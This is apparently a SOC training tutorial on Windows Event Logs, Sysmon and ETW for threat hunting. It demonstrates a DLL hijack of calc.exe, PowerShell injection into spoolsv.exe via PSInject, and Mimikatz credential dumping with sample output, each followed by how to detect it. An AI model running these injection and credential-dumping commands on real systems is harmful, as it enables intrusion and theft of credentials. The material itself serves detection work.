![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/c40579bd-c726-471d-8ec0-6e56e72cc4a9)


Each entry in the Windows Event Log is an "Event" and contains the following primary components:

- Log Name: The name of the event log (e.g., Application, System, Security, etc.).
- Source: The software that logged the event.
- Event ID: A unique identifier for the event.
- Task Category: This often contains a value or name that can help us understand the purpose or use of the event.
- Level: The severity of the event (Information, Warning, Error, Critical, and Verbose).
- Keywords: Keywords are flags that allow us to categorize events in ways beyond the other classification options. These are generally broad categories, such as "Audit Success" or "Audit Failure" in the Security log.
- User: The user account that was logged on when the event occurred.
- OpCode: This field can identify the specific operation that the event reports.
- Logged: The date and time when the event was logged.
- Computer: The name of the computer where the event occurred.
- XML Data: All the above information is also included in an XML format along with additional event data.


The Keywords field is particularly useful when filtering event logs for specific types of events. It can significantly enhance the precision of search queries by allowing us to specify events of interest, thus making log management more efficient and effective.

Taking a closer look at the event log above, we observe several crucial elements. The Event ID in the top left corner serves as a unique identifier, which can be further researched on Microsoft's website to gather additional information. The "SideBySide" label next to the event ID represents the event source. Below, we find the general error description, often containing rich details. By clicking on the details, we can further analyze the event's impact using XML or a well-formatted view.

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/a09836ba-7639-440b-8e3d-c62cde77060b)

Additionally, we can extract supplementary information from the event log, such as the process ID where the error occurred, enabling more precise analysis.

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/9a793624-ebc0-4e8e-b44d-1a647312df3d)

Switching our focus to security logs, let's consider event ID 4624, a commonly occurring event (detailed at https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4624).

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/3c649af7-571d-43fd-a766-a0492c57823d)

According to Microsoft's documentation, this event signifies the creation of a logon session on the destination machine, originating from the accessed computer where the session was established. Within this log, we find crucial details, including the "Logon ID", which allows us to correlate this logon with other events sharing the same "Logon ID". Another important detail is the "Logon Type", indicating the type of logon. In this case, it specifies a Service logon type, suggesting that "SYSTEM" initiated a new service. However, further investigation is required to determine the specific service involved, utilizing correlation techniques with additional data like the "Logon ID".

**Leveraging Custom XML Queries**

To streamline our analysis, we can create custom XML queries to identify related events using the "Logon ID" as a starting point. By navigating to "Filter Current Log" -> "XML" -> "Edit Query Manually," we gain access to a custom XML query language that enables more granular log searches.

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/e47f75dd-77ec-4134-a7a1-f41beef1bba5)


In the example query, we focus on events containing the "SubjectLogonId" field with a value of "0x3E7". The selection of this value stems from the need to correlate events associated with a specific "Logon ID" and understand the relevant details within those events.

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/887206cd-f4b9-41b7-b7d8-fa0052762e4d)


t is worth noting that if assistance is required in crafting the query, automatic filters can be enabled, allowing exploration of their impact on the XML representation. For further guidance, Microsoft offers informative articles on advanced XML filtering in the Windows Event Viewer.

By constructing such queries, we can narrow down our focus to the account responsible for initiating the service and eliminate unnecessary details. This approach helps unveil a clearer picture of recent logon activities associated with the specified Logon ID. However, even with this refinement, the amount of data remains significant.

Delving into the log details progressively reveals a narrative. For instance, the analysis begins with Event ID 4907, which signifies an audit policy change.

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/7410657e-2f7f-4318-9f00-b30fdcbafd17)

Within the event description, we find valuable insights, such as "This event generates when the SACL of an object (for example, a registry key or file) was changed."

In case unfamiliar with SACL, referring to the provided link (https://docs.microsoft.com/en-us/windows/win32/secauthz/access-control-lists) sheds light on access control lists (ACLs). The "S" in SACL denotes a system access control list, which enables administrators to log access attempts to secure objects. Each Access Control Entry (ACE) within a SACL specifies the types of access attempts by a designated trustee that trigger record generation in the security event log. ACEs in a SACL can generate audit records upon failed, successful, or both types of access attempts. For more information about SACLs, see Audit Generation and SACL Access Right."

Based on this information, it becomes apparent that the permissions of a file were altered to modify the logging or auditing of access attempts. Further exploration of the event details reveals additional intriguing aspects.

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/2c0971e8-a1c1-42b6-b163-1216cbf967c1)

For example, the process responsible for the change is identified as "SetupHost.exe", indicating a potential setup process (although it's worth noting that malware can sometimes masquerade under legitimate names). The object name impacted appears to be the "bootmanager", and we can examine the new and old security descriptors ("NewSd" and "OldSd") to identify the changes. Understanding the meaning of each field in the security descriptor can be accomplished through references such as the article ACE Strings and Understanding SDDL Syntax.

From the observed events, we can infer that a setup process occurred, involving the creation of a new file and the initial configuration of security permissions for auditing purposes. Subsequently, we encounter the logon event, followed by a "special logon" event.

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/96d0e7f5-3179-4d8c-bb64-0c8f8dca7ebe)

Analyzing the special logon event, we gain insights into token permissions granted to the user upon a successful logon.

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/81dd300a-cb74-495d-ad4b-747e1b59bd9b)


A comprehensive list of privileges can be found in the documentation on privilege constants. For instance, the "SeDebugPrivilege" privilege indicates that the user possesses the ability to tamper with memory that does not belong to them.

Useful Windows Event Logs

Find below an indicative (non-exhaustive) list of useful Windows event logs.

1. Windows System Logs

- Event ID 1074 (System Shutdown/Restart): This event log indicates when and why the system was shut down or restarted. By monitoring these events, you can determine if there are unexpected shutdowns or restarts, potentially revealing malicious activity such as malware infection or unauthorized user access.
- Event ID 6005 (The Event log service was started): This event log marks the time when the Event Log Service was started. This is an important record, as it can signify a system boot-up, providing a starting point for investigating system performance or potential security incidents around that period. It can also be used to detect unauthorized system reboots.
- Event ID 6006 (The Event log service was stopped): This event log signifies the moment when the Event Log Service was stopped. It is typically seen when the system is shutting down. Abnormal or unexpected occurrences of this event could point to intentional service disruption for covering illicit activities.
- Event ID 6013 (Windows uptime): This event occurs once a day and shows the uptime of the system in seconds. A shorter than expected uptime could mean the system has been rebooted, which could signify a potential intrusion or unauthorized activities on the system.
- Event ID 7040 (Service status change): This event indicates a change in service startup type, which could be from manual to automatic or vice versa. If a crucial service's startup type is changed, it could be a sign of system tampering.


2. Windows Security Logs

-  Event ID 1102 (The audit log was cleared): Clearing the audit log is often a sign of an attempt to remove evidence of an intrusion or malicious activity.
-  Event ID 1116 (Antivirus malware detection): This event is particularly important because it logs when Defender detects a malware. A surge in these events could indicate a targeted attack or widespread malware infection.
-  Event ID 1118 (Antivirus remediation activity has started): This event signifies that Defender has begun the process of removing or quarantining detected malware. It's important to monitor these events to ensure that remediation activities are successful.
-  Event ID 1119 (Antivirus remediation activity has succeeded): This event signifies that the remediation process for detected malware has been successful. Regular monitoring of these events will help ensure that identified threats are effectively neutralized.
-  Event ID 1120 (Antivirus remediation activity has failed): This event is the counterpart to 1119 and indicates that the remediation process has failed. These events should be closely monitored and addressed immediately to ensure threats are effectively neutralized.
-  Event ID 4624 (Successful Logon): This event records successful logon events. This information is vital for establishing normal user behavior. Abnormal behavior, such as logon attempts at odd hours or from different locations, could signify a potential security threat.
-  Event ID 4625 (Failed Logon): This event logs failed logon attempts. Multiple failed logon attempts could signify a brute-force attack in progress.
-  Event ID 4648 (A logon was attempted using explicit credentials): This event is triggered when a user logs on with explicit credentials to run a program. Anomalies in these logon events could indicate lateral movement within a network, which is a common technique used by attackers.
-  Event ID 4656 (A handle to an object was requested): This event is triggered when a handle to an object (like a file, registry key, or process) is requested. This can be a useful event for detecting attempts to access sensitive resources.
-  Event ID 4672 (Special Privileges Assigned to a New Logon): This event is logged whenever an account logs on with super user privileges. Tracking these events helps to ensure that super user privileges are not being abused or used maliciously.
-  Event ID 4698 (A scheduled task was created): This event is triggered when a scheduled task is created. Monitoring this event can help you detect persistence mechanisms, as attackers often use scheduled tasks to maintain access and run malicious code.
-  Event ID 4700 & Event ID 4701 (A scheduled task was enabled/disabled): This records the enabling or disabling of a scheduled task. Scheduled tasks are often manipulated by attackers for persistence or to run malicious code, thus these logs can provide valuable insight into suspicious activities.
-  Event ID 4702 (A scheduled task was updated): Similar to 4698, this event is triggered when a scheduled task is updated. Monitoring these updates can help detect changes that may signify malicious intent.
-  Event ID 4719 (System audit policy was changed): This event records changes to the audit policy on a computer. It could be a sign that someone is trying to cover their tracks by turning off auditing or changing what events get audited.
-  Event ID 4738 (A user account was changed): This event records any changes made to user accounts, including changes to privileges, group memberships, and account settings. Unexpected account changes can be a sign of account takeover or insider threats.
-  Event ID 4771 (Kerberos pre-authentication failed): This event is similar to 4625 (failed logon) but specifically for Kerberos authentication. An unusual amount of these logs could indicate an attacker attempting to brute force your Kerberos service.
-  Event ID 4776 (The domain controller attempted to validate the credentials for an account): This event helps track both successful and failed attempts at credential validation by the domain controller. Multiple failures could suggest a brute-force attack.
-  Event ID 5001 (Antivirus real-time protection configuration has changed): This event indicates that the real-time protection settings of Defender have been modified. Unauthorized changes could indicate an attempt to disable or undermine the functionality of Defender.
-  Event ID 5140 (A network share object was accessed): This event is logged whenever a network share is accessed. This can be critical in identifying unauthorized access to network shares.
-  Event ID 5142 (A network share object was added): This event signifies the creation of a new network share. Unauthorized network shares could be used to exfiltrate data or spread malware across a network.
-  Event ID 5145 (A network share object was checked to see whether client can be granted desired access): This event indicates that someone attempted to access a network share. Frequent checks of this sort might indicate a user or a malware trying to map out the network shares for future exploits.
-  Event ID 5157 (The Windows Filtering Platform has blocked a connection): This is logged when the Windows Filtering Platform blocks a connection attempt. This can be helpful for identifying malicious traffic on your network.
-  Event ID 7045 (A service was installed in the system): A sudden appearance of unknown services might suggest malware installation, as many types of malware install themselves as services.

Remember, one of the key aspects of threat detection is having a good understanding of what is "normal" in our environment. Anomalies that might indicate a threat in one environment could be normal behavior in another. It's crucial to tune our monitoring and alerting systems to our environment to minimize false positives and make real threats easier to spot. In addition, it's essential to have a centralized log management solution in place that can collect, parse, and alert on these events in real-time. Regularly monitoring and reviewing these logs can help in early detection and mitigation of threats. Lastly, we need to make sure to correlate these logs with other system and security logs to get a more holistic view of the security events in our environment.

**Analyzing Evil With Sysmon & Event Logs**
In our pursuit of robust cybersecurity, it is crucial to understand how to identify and analyze malicious events effectively. Building upon our previous exploration of benign events, we will now delve into the realm of malicious activities and discover techniques for detection.

**Sysmon Basics**

When investigating malicious events, several event IDs serve as common indicators of compromise. For instance, Event ID 4624 provides insights into new logon events, enabling us to monitor and detect suspicious user access and logon patterns. Similarly, Event ID 4688 furnishes information about newly created processes, aiding the identification of unusual or malicious process launches. To enhance our event log coverage, we can extend the capabilities by incorporating Sysmon, which offers additional event logging capabilities.

**System Monitor (Sysmon)** is a Windows system service and device driver that remains resident across system reboots to monitor and log system activity to the Windows event log. Sysmon provides detailed information about process creation, network connections, changes to file creation time, and more.

**Sysmon's primary components include:**

- A Windows service for monitoring system activity.
- A device driver that assists in capturing the system activity data.
- An event log to display captured activity data.

Sysmon's unique capability lies in its ability to log information that typically doesn't appear in the Security Event logs, and this makes it a powerful tool for deep system monitoring and cybersecurity forensic analysis.

Sysmon categorizes different types of system activity using event IDs, where each ID corresponds to a specific type of event. For example, Event ID 1 corresponds to "Process Creation" events, and Event ID 3 refers to "Network Connection" events. The full list of Sysmon event IDs can be found here.

For more granular control over what events get logged, Sysmon uses an XML-based configuration file. The configuration file allows you to include or exclude certain types of events based on different attributes like process names, IP addresses, etc. We can refer to popular examples of useful Sysmon configuration files:

- For a comprehensive configuration, we can visit:

```
(https://github.com/SwiftOnSecurity/sysmon-config. <-- We will use this one in this section!)
```

```
Another option is: https://github.com/olafhartong/sysmon-modular, which provides a modular approach.
```

To get started, you can install Sysmon by downloading it from the official Microsoft documentation (https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon). Once downloaded, open an administrator command prompt and execute the following command to install Sysmon.

```
C:\Tools\Sysmon> sysmon.exe -i -accepteula -h md5,sha256,imphash -l -n
```

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/66952e1d-f023-443a-b006-20900b04250c)

To utilize a custom Sysmon configuration, execute the following after installing Sysmon.

```
C:\Tools\Sysmon> sysmon.exe -c filename.xml
```

**Detection Example 1: Detecting DLL Hijacking**

In our specific use case, we aim to detect a DLL hijack. The Sysmon event log IDs relevant to DLL hijacks can be found in the Sysmon documentation (https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon). To detect a DLL hijack, we need to focus on Event Type 7, which corresponds to module load events. To achieve this, we need to modify the sysmonconfig-export.xml Sysmon configuration file we downloaded from https://github.com/SwiftOnSecurity/sysmon-config.

By examining the modified configuration, we can observe that the "include" comment signifies events that should be included.

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/5cf88ac7-9479-4f87-b665-e201328422a7)

In the case of detecting DLL hijacks, we change the "include" to "exclude" to ensure that nothing is excluded, allowing us to capture the necessary data.

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/9e3e6e3a-6785-4af9-837c-eeb5493a9f2b)

To utilize the updated Sysmon configuration, execute the following.
```
C:\Tools\Sysmon> sysmon.exe -c sysmonconfig-export.xml
```
![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/8d82aec3-3c66-449b-aefd-b50bacb17274)

With the modified Sysmon configuration, we can start observing image load events. To view these events, navigate to the Event Viewer and access "Applications and Services" -> "Microsoft" -> "Windows" -> "Sysmon." A quick check will reveal the presence of the targeted event ID.


![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/3b608e97-72ce-4764-aba0-39b7df835fd1)

Let's now see how a Sysmon event ID 7 looks like.

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/a8041463-7ff3-4b98-9d89-cbd7f85e532d)

The event log contains the DLL's signing status (in this case, it is Microsoft-signed), the process or image responsible for loading the DLL, and the specific DLL that was loaded. In our example, we observe that "MMC.exe" loaded "psapi.dll", which is also Microsoft-signed. Both files are located in the System32 directory.

Now, let's proceed with building a detection mechanism. To gain more insights into DLL hijacks, conducting research is paramount. We stumble upon an informative blog post that provides an exhaustive list of various DLL hijack techniques. For the purpose of our detection, we will focus on a specific hijack involving the vulnerable executable calc.exe and a list of DLLs that can be hijacked.


![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/c386fd47-f628-4eb6-94f8-d4f5690b1795)

Let's attempt the hijack using "calc.exe" and "WININET.dll" as an example. To simplify the process, we can utilize Stephen Fewer's "hello world" reflective DLL. It should be noted that DLL hijacking does not require reflective DLLs.

By following the required steps, which involve renaming reflective_dll.x64.dll to WININET.dll, moving calc.exe from C:\Windows\System32 along with WININET.dll to a writable directory (such as the Desktop folder), and executing calc.exe, we achieve success. Instead of the Calculator application, a MessageBox is displayed.

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/42a8036e-59ef-4203-b051-46b922d0d16a)

Next, we analyze the impact of the hijack. First, we filter the event logs to focus on Event ID 7, which represents module load events, by clicking "Filter Current Log...".


![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/7f9cee1a-434d-47e2-94c0-befeb63ce5ce)

Subsequently, we search for instances of "calc.exe", by clicking "Find...", to identify the DLL load associated with our hijack.

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/6d36df53-c6c8-4745-9b80-fd1b2c804de2)


The output from Sysmon provides valuable insights. Now, we can observe several indicators of compromise (IOCs) to create effective detection rules. Before moving forward though, let's compare this to an authenticate load of "wininet.dll" by "calc.exe".
![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/c43f0001-1967-4341-8fd6-97ad4fcdcb16)

**Let's explore these IOCs:**

1. "calc.exe", originally located in System32, should not be found in a writable directory. Therefore, a copy of "calc.exe" in a writable directory serves as an IOC, as it should always reside in System32 or potentially Syswow64.

2. "WININET.dll", originally located in System32, should not be loaded outside of System32 by calc.exe. If instances of "WININET.dll" loading occur outside of System32 with "calc.exe" as the parent process, it indicates a DLL hijack within calc.exe. While caution is necessary when alerting on all instances of "WININET.dll" loading outside of System32 (as some applications may package specific DLL versions for stability), in the case of "calc.exe", we can confidently assert a hijack due to the DLL's unchanging name, which attackers cannot modify to evade detection.

3. The original "WININET.dll" is Microsoft-signed, while our injected DLL remains unsigned.

These three powerful IOCs provide an effective means of detecting a DLL hijack involving calc.exe. It's important to note that while Sysmon and event logs offer valuable telemetry for hunting and creating alert rules, they are not the sole sources of information.

### Detection Example 2: Detecting Unmanaged PowerShell/C-Sharp Injection


Before delving into detection techniques, let's gain a brief understanding of C# and its runtime environment. C# is considered a "managed" language, meaning it requires a backend runtime to execute its code. The Common Language Runtime (CLR) serves as this runtime environment. Managed code does not directly run as assembly; instead, it is compiled into a bytecode format that the runtime processes and executes. Consequently, a managed process relies on the CLR to execute C# code.

As defenders, we can leverage this knowledge to detect unusual C# injections or executions within our environment. To accomplish this, we can utilize a useful utility called Process Hacker.

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/5a4dbc0d-43ac-48b2-825a-f219ce611d94)


By using Process Hacker, we can observe a range of processes within our environment. Sorting the processes by name, we can identify interesting color-coded distinctions. Notably, "powershell.exe", a managed process, is highlighted in green compared to other processes. Hovering over powershell.exe reveals the label "Process is managed (.NET)," confirming its managed status.


![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/d9ca38fe-9353-419a-80cc-27fc03d24723)

Examining the module loads for powershell.exe, by right-clicking on powershell.exe, clicking "Properties", and navigating to "Modules", we can find relevant information.
![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/f2fe800c-9798-455c-8c5d-1038a69a709a)


The presence of "Microsoft .NET Runtime...", clr.dll, and clrjit.dll should attract our attention. These 2 DLLs are used when C# code is ran as part of the runtime to execute the bytecode. If we observe these DLLs loaded in processes that typically do not require them, it suggests a potential execute-assembly or unmanaged PowerShell injection attack.

To showcase unmanaged PowerShell injection, we can inject an unmanaged PowerShell-like DLL into a random process, such as spoolsv.exe. We can do that by utilizing the PSInject project in the following manner.

```
powershell -ep bypass
Import-Module .\Invoke-PSInject.ps1
Invoke-PSInject -ProcId [Process ID of spoolsv.exe] -PoshCode "V3JpdGUtSG9zdCAiSGVsbG8sIEd1cnU5OSEi"
```

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/adfbbcb0-7dd2-4d8e-b730-fa311e2a0c1d)

After the injection, we observe that "spoolsv.exe" transitions from an unmanaged to a managed state.

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/465879ed-cb30-4d20-8956-d79b5ab8903f)


Additionally, by referring to both the related "Modules" tab of Process Hacker and Sysmon Event ID 7, we can examine the DLL load information to validate the presence of the aforementioned DLLs.

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/8ec962eb-6177-4dfc-b69f-07ff07caaf3b)

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/c8eeac50-b534-4a6b-9dd5-d299da77749e)

**Detection Example 3: Detecting Credential Dumping**
Another critical aspect of cybersecurity is detecting credential dumping activities. One widely used tool for credential dumping is Mimikatz, offering various methods for extracting Windows credentials. One specific command, "sekurlsa::logonpasswords", enables the dumping of password hashes or plaintext passwords by accessing the Local Security Authority Subsystem Service (LSASS). LSASS is responsible for managing user credentials and is a primary target for credential-dumping tools like Mimikatz.

The attack can be executed as follows.

```
C:\Tools\Mimikatz> mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 1128191 (00000000:001136ff)
Session           : RemoteInteractive from 2
User Name         : Administrator
Domain            : DESKTOP-NU10MTO
Logon Server      : DESKTOP-NU10MTO
Logon Time        : 5/31/2023 4:14:41 PM
SID               : S-1-5-21-2712802632-2324259492-1677155984-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : DESKTOP-NU10MTO
         * NTLM     : XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
         * SHA1     : XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX0812156b
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : DESKTOP-NU10MTO
         * Password : (null)
        kerberos :
         * Username : Administrator
         * Domain   : DESKTOP-NU10MTO
         * Password : (null)
        ssp :   KO
        credman :
```

As we can see, the output of the "sekurlsa::logonpasswords" command provides powerful insights into compromised credentials.

To detect this activity, we can rely on a different Sysmon event. Instead of focusing on DLL loads, we shift our attention to process access events. By checking Sysmon event ID 10, which represents "ProcessAccess" events, we can identify any suspicious attempts to access LSASS.
![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/aad9cc3b-d9db-4c8a-b7a3-f63470f4a89f)

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/07711b88-7b64-4019-bce1-a572ae6c1320)

For instance, if we observe a random file ("AgentEXE" in this case) from a random folder ("Downloads" in this case) attempting to access LSASS, it indicates unusual behavior. Additionally, the SourceUser being different from the TargetUser (e.g., "waldo" as the SourceUser and "SYSTEM" as the TargetUser) further emphasizes the abnormality. It's also worth noting that as part of the mimikatz-based credential dumping process, the user must request SeDebugPrivileges. As the name suggests, it's primarily used for debugging. This can be another Indicator of Compromise (IOC).

Please note that some legitimate processes may access LSASS, such as authentication-related processes or security tools like AV or EDR.

### Event Tracing for Windows (ETW)

In the realm of effective threat detection and incident response, we often find ourselves relying on the limited log data at our disposal. However, this approach falls short of fully harnessing the immense wealth of information that can be derived from the powerful resource known as **Event Tracing for Windows (ETW)**. Unfortunately, this oversight can be attributed to a lack of awareness and appreciation for the comprehensive and intricate insights that ETW can offer.

**What is ETW?**

According to Microsoft, Event Tracing For Windows (ETW) is a general-purpose, high-speed tracing facility provided by the operating system. Using a buffering and logging mechanism implemented in the kernel, ETW provides a tracing mechanism for events raised by both user-mode applications and kernel-mode device drivers.

ETW, functioning as a high-performance event tracing mechanism deeply embedded within the Windows operating system, presents an unparalleled opportunity to bolster our defense capabilities. Its architecture facilitates the dynamic generation, collection, and analysis of various events occurring within the system, resulting in the creation of intricate, real-time logs that encompass a wide spectrum of activities.

By effectively leveraging ETW, we can tap into an expansive array of telemetry sources that surpass the limitations imposed by traditional log data. ETW captures a diverse set of events, spanning system calls, process creation and termination, network activity, file and registry modifications, and numerous other dimensions. These events collectively weave a detailed tapestry of system activity, furnishing invaluable context for the identification of anomalous behavior, discovery of potential security incidents, and facilitation of forensic investigations.

ETW's versatility and extensibility are further accentuated by its seamless integration with Event Providers. These specialized components generate specific types of events and can be seamlessly incorporated into applications, operating system components, or third-party software. Consequently, this integration ensures a broad coverage of potential event sources. Furthermore, ETW's extensibility enables the creation of custom providers tailored to address specific organizational requirements, thereby fostering a targeted and focused approach to logging and monitoring.

Notably, ETW's lightweight nature and minimal performance impact render it an optimal telemetry solution for real-time monitoring and continuous security assessment. By selectively enabling and configuring relevant event providers, we can finely adjust the scope of data collection to align with our specific security objectives, striking a harmonious balance between the richness of information and system performance considerations.

Moreover, the existence of robust tooling and utilities, including Microsoft's Message Analyzer and PowerShell's Get-WinEvent cmdlet, greatly simplifies the retrieval, parsing, and analysis of ETW logs. These tools offer advanced filtering capabilities, event correlation mechanisms, and real-time monitoring features, empowering members of the blue team to extract actionable insights from the vast pool of information captured by ETW.


**ETW Architecture & Components**

The underlying architecture and the key components of Event Tracing for Windows (ETW) are illustrated in the following diagram from Microsoft.

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/e5b213f0-257e-4581-8af4-8e1b7fa237db)

- Controllers: The Controllers component, as its name implies, assumes control over all aspects related to ETW operations. It encompasses functionalities such as initiating and terminating trace sessions, as well as enabling or disabling providers within a particular trace. Trace sessions can establish subscriptions to one or multiple providers, thereby granting the providers the ability to commence logging operations. An example of a widely used controller is the built-in utility "logman.exe," which facilitates the management of ETW activities.

At the core of ETW's architecture is the publish-subscribe model. This model involves two primary components:

- Providers: Providers play a pivotal role in generating events and writing them to the designated ETW sessions. Applications have the ability to register ETW providers, enabling them to generate and transmit numerous events. There are four distinct types of providers utilized within ETW.
- MOF Providers: These providers are based on Managed Object Format (MOF) and are capable of generating events according to predefined MOF schemas. They offer a flexible approach to event generation and are widely used in various scenarios.
- WPP Providers: Standing for "Windows Software Trace Preprocessor," WPP providers leverage specialized macros and annotations within the application's source code to generate events. This type of provider is often utilized for low-level kernel-mode tracing and debugging purposes.
- Manifest-based Providers: Manifest-based providers represent a more contemporary form of providers within ETW. They rely on XML manifest files that define the structure and characteristics of events. This approach offers enhanced flexibility and ease of management, allowing for dynamic event generation and customization.
- TraceLogging Providers: TraceLogging providers offer a simplified and efficient approach to event generation. They leverage the TraceLogging API, introduced in recent Windows versions, which streamlines the process of event generation with minimal code overhead.
- Consumers: Consumers subscribe to specific events of interest and receive those events for further processing or analysis. By default, the events are typically directed to an .ETL (Event Trace Log) file for handling. However, an alternative consumer scenario involves leveraging the capabilities of the Windows API to process and consume the events.
- Channels: To facilitate efficient event collection and consumption, ETW relies on event channels. Event channels act as logical containers for organizing and filtering events based on their characteristics and importance. ETW supports multiple channels, each with its own defined purpose and audience. Event consumers can selectively subscribe to specific channels to receive relevant events for their respective use cases.
- ETL files: ETW provides specialized support for writing events to disk through the use of event trace log files, commonly referred to as "ETL files." These files serve as durable storage for events, enabling offline analysis, long-term archiving, and forensic investigations. ETW allows for seamless rotation and management of ETL files to ensure efficient storage utilization.

> [!NOTE]
-  ETW supports event providers in both kernel mode and user mode.
-  Some event providers generate a significant volume of events, which can potentially overwhelm the system resources if they are constantly active. As a result, to prevent unnecessary resource consumption, these providers are typically disabled by default and are only enabled when a tracing session specifically requests their activation.
-  In addition to its inherent capabilities, ETW can be extended through custom event providers.
-  Only ETW provider events that have a Channel property applied to them can be consumed by the event log
-  Refer to : https://medium.com/threat-hunters-forge/threat-hunting-with-etw-events-and-helk-part-1-installing-silketw-6eb74815e4a0


### Interacting With ETW

Logman is a pre-installed utility for managing Event Tracing for Windows (ETW) and Event Tracing Sessions. This tool is invaluable for creating, initiating, halting, and investigating tracing sessions. This is particularly useful when determining which sessions are set for data collection or when initiating your own data collection.

Employing the -ets parameter will allow for a direct investigation of the event tracing sessions, providing insights into system-wide tracing sessions. As an example, the Sysmon Event Tracing Sessions can be found towards the end of the displayed information.

```
C:\Tools> logman.exe query -ets

Data Collector Set                      Type                          Status
-------------------------------------------------------------------------------
Circular Kernel Context Logger          Trace                         Running
Eventlog-Security                       Trace                         Running
DiagLog                                 Trace                         Running
Diagtrack-Listener                      Trace                         Running
EventLog-Application                    Trace                         Running
EventLog-Microsoft-Windows-Sysmon-Operational Trace                         Running
EventLog-System                         Trace                         Running
LwtNetLog                               Trace                         Running
Microsoft-Windows-Rdp-Graphics-RdpIdd-Trace Trace                         Running
NetCore                                 Trace                         Running
NtfsLog                                 Trace                         Running
RadioMgr                                Trace                         Running
UBPM                                    Trace                         Running
WdiContextLog                           Trace                         Running
WiFiSession                             Trace                         Running
SHS-06012023-115154-7-7f                Trace                         Running
UserNotPresentTraceSession              Trace                         Running
8696EAC4-1288-4288-A4EE-49EE431B0AD9    Trace                         Running
ScreenOnPowerStudyTraceSession          Trace                         Running
SYSMON TRACE                            Trace                         Running
MSDTC_TRACE_SESSION                     Trace                         Running
SysmonDnsEtwSession                     Trace                         Running
MpWppTracing-20230601-115025-00000003-ffffffff Trace                         Running
WindowsUpdate_trace_log                 Trace                         Running
Admin_PS_Provider                       Trace                         Running
Terminal-Services-LSM-ApplicationLag-3764 Trace                         Running
Microsoft.Windows.Remediation           Trace                         Running
SgrmEtwSession                          Trace                         Running

The command completed successfully.
```


When we examine an Event Tracing Session directly, we uncover specific session details including the Name, Max Log Size, Log Location, and the subscribed providers. This information is invaluable for incident responders. Discovering a session that records providers relevant to your interests may provide crucial logs for an investigation.

Please note that the “-ets” parameter is vital to the command. Without it, Logman will not identify the Event Tracing Session.

For each provider subscribed to the session, we can acquire critical data:

- Name / Provider GUID: This is the exclusive identifier for the provider.
- Level: This describes the event level, indicating if it's filtering for warning, informational, critical, or all events.
- Keywords Any: Keywords create a filter based on the kind of event generated by the provider.


```
C:\Tools> logman.exe query "EventLog-System" -ets


Name:                 EventLog-System
Status:               Running
Root Path:            %systemdrive%\PerfLogs\Admin
Segment:              Off
Schedules:            On
Segment Max Size:     100 MB

Name:                 EventLog-System\EventLog-System
Type:                 Trace
Append:               Off
Circular:             Off
Overwrite:            Off
Buffer Size:          64
Buffers Lost:         0
Buffers Written:      47
Buffer Flush Timer:   1
Clock Type:           System
File Mode:            Real-time

Provider:
Name:                 Microsoft-Windows-FunctionDiscoveryHost
Provider Guid:        {538CBBAD-4877-4EB2-B26E-7CAEE8F0F8CB}
Level:                255
KeywordsAll:          0x0
KeywordsAny:          0x8000000000000000 (System)
Properties:           65
